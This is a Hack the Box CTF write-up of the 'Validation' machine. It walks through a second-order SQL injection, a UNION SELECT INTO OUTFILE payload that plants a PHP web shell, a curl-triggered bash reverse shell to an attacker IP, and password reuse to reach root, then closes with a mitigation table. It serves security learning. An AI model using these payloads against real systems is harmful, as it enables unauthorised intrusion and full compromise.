--- 
title: "Hack the Box (HTB) - Validation"
description: "Exploiting Second-Order SQL Injection"
date: 2024-07-13 12:00:00 -100
image: /assets/images/HTB - Validation Pics/Validation_Thumbnail.png
categories: [CTF]
tags: [sql injection, privilege escalation, password reuse]    # TAG names should always be lowercase
---

## Enumeration

We'll start with an [autorecon](https://github.com/Tib3rius/AutoRecon) scan against our target machine

```bash
sudo autorecon <ip>
```

Looking at the results, we see the following ports open

- 22 (SSH)
- 80 (HTTP)
- 4566 (HTTP)
- 8080 (HTTP)
- Various filtered ports

![Nmap Scan](/assets/images/HTB%20-%20Validation%20Pics/Nmap%20scan_validated.png)

We'll start with the low hanging fruit of this scan and check out the apache web server hosted on port 80. It appears to be a docker container as SSH identifies as `Ubuntu` and the web server identified as `Debian`

![Web page](/assets/images/HTB%20-%20Validation%20Pics/Web%20page.png)

Let's type in our user and check the request in burp

![Burp](/assets/images/HTB%20-%20Validation%20Pics/inital_burp.png)

let's toss this over to repeater with `CTRL + R` and examine the request & responses

The first thing we notice is the static `cookie` that we get when sending the request

The length of the cookie is 32 characters and is a `MD5` of our username. MD5 is obviously deprecated and would be a finding on a real vulnerability assessment but for our purposes in this CTF we will move forward

Let's try a simple SQL injection on the country parameter since we couldn't manually edit that in the GUI

```bash
username=Jigsaw64&country=Anguilla' 
```

Copying the cookie and editing it into our cookie user field We see the following error:

 `Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool in
/var/www/html/account.php:33 Stack trace: #0 {main} thrown in /var/www/html/account.php
on line 33`

![Fatal error](/assets/images/HTB%20-%20Validation%20Pics/Fatal%20error.png)

Our single quote `'` seems to have broken the SQL query and gave us an error.

Let's try commenting out the rest of the statement with `-- -`

The error went away once we commented out the rest of the query. This confirms that we have SQLi

Let's enumerate the number of columns by adding a simple union select statement 

```SQL
username=Jigsaw94&country=Brazil' union select  1-- -
```

![No SQL error](/assets/images/HTB%20-%20Validation%20Pics/No%20SQL%20error.png)

No error, which confirms that we only have on column

With this we can now use the union select to insert a php shell 

```PHP / SQL
Brazil' UNION SELECT '<?php system($_REQUEST["cmd"]); ?>' INTO OUTFILE '/var/www/html/pwned.php'-- -
```

- `system()` PHP function used to execute shell commands
- `$_REQUEST["cmd"]` PHP superglobal variable that grabs the value of cmd parameter from the HTTP request
- `INTO OUTFILE` writes the query to a file
-  `-- -` comment out the remaining SQL

Our SQL statement will take the value of our HTTP request and write it to `pwned.php`

After submitting the payload, we will need to visit `/account.php`. Our payload won't trigger until we load that, which makes this a [Second-Order SQL Injection](https://portswigger.net/kb/issues/00100210_sql-injection-second-order)

![Pwned PHP Uploaded](/assets/images/HTB%20-%20Validation%20Pics/Pwned%20php.png)

We see another error but this is due to the fact that our query did not return any columns or rows. We should be able to navigate to `pwned.php` and verify that our injection worked

![CMD1](/assets/images/HTB%20-%20Validation%20Pics/CMD1.png)

It looks like it works. The error is only due to the fact that we did not supply a command

![CMD2](/assets/images/HTB%20-%20Validation%20Pics/CMD2.png)

With this confirmation of RCE. Let's curl a shell request. We'll set up our `nc` listener and enter the following curl command

```bash
curl -X POST http://10.10.11.116/pwned.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/<YOURIP>/PORT 0>&1"'
```
![Shell Obtained](/assets/images/HTB%20-%20Validation%20Pics/Shell%20Obtained.png)

We have our shell. Since python is not installed on t his container I am going to use the following to upgrade to a pty

```bash
script -q /dev/null
```

![Upgraded shell](/assets/images/HTB%20-%20Validation%20Pics/Upgraded%20shell.png)

We immediately notice a `config.php` file. This is gold, let's take a look

![Config.php](/assets/images/HTB%20-%20Validation%20Pics/password.png)

We see a password `uhc-9qual-global-pw` here, let's try switching to root with this

![Root](/assets/images/HTB%20-%20Validation%20Pics/Root.png)

GG, we've obtained root on this box



## Vulnerabilities & Mitigation Summary

| Vulnerability     | Mitigation            |
|-------------------|-----------------------|
| Static Cookies Assigned by Username  | Use secure, ephemeral, randomly generated session identifiers |
| Use of Deprecated Hash (MD5) | Use a stronger hash function like SHA-256 or bcrypt|
| SQL Injection     | Validate and sanitize user input. Use prepared statements|
| Password Reuse | Don't reuse passwords!

### Remediation References

- [OWASP Secure Cookie Practices](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#secure-cookies)
- [Second-Order SQL Injection](https://portswigger.net/kb/issues/00100210_sql-injection-second-order)
